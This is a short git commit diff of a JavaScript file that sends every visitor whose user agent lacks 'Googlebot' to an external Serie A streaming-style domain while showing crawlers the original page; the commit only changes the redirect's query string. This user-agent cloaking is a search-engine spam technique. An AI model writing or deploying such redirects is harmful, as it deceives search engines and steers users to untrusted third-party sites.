ade9caf76f3ada9f9ccb4a228914096a7830d078
dinruba001 <info.ahasan2004+54884@gmail.com>
2026-09-20 17:20:58 +0600

    Update Italian-Serie.js

--- Italian-Serie.js
+++ Italian-Serie.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://sdhsaatv.pro/serie-a/?m=Parma vs Genoa";
+  window.location.href = "https://sdhsaatv.pro/serie-a/?m=Italian Serie A";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
